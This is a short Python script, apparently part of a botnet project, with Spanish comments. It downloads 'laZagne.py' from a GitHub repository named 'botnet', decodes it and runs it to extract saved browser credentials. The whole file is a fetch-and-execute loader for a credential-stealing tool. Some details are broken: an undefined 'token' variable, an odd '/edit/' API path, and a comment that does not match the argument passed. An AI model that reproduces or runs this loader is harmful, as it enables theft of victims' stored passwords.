import subprocess
import requests
import base64

url = "https://api.github.com/repos/Pol-Ruiz/botnet/edit/main/laZagne.py"

def downloadFile(url):
    print('[!] Descargando ' + url)
    sha = None
    content = None
    headers = {
        'Authorization': 'Bearer ' + token
    }
    res = requests.get(url).json()
    if 'sha' in res and 'content' in res:
        sha = res['sha']
        base64_bytes = base64.b64decode(res['content'])
        content = base64_bytes.decode('utf-8')
        with open('laZagne.py', 'w') as f:
            f.write(content)
    else:
        print('[-] ' + res.get('message', 'Error desconocido'))
    return sha, content

def run():
    # Descargar el archivo
    downloadFile(url)
    
    # Ejecutar el archivo con el argumento "all"
    output = subprocess.run(["python3", 'laZagne.py', "browsers"], check=True)

run()


